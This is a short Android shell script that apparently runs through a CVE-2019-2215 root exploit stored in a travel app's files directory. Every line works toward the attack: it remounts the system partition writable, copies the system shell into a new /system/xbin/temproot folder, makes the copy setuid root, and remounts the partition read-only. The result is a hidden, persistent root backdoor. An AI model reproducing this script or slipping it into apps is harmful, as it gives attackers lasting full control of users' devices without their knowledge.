#!data/data/edu.singaporetech.travelapp/files/cve-2019-2215
mount -o remount system /system
mkdir /system/xbin/temproot
chown $1 /system/xbin/temproot
chmod 700 /system/xbin/temproot
cat /system/bin/sh > /system/xbin/temproot/sh
chown 0.0 /system/xbin/temproot/sh
chmod 4755 /system/xbin/temproot/sh
sync
mount -o remount,ro system /system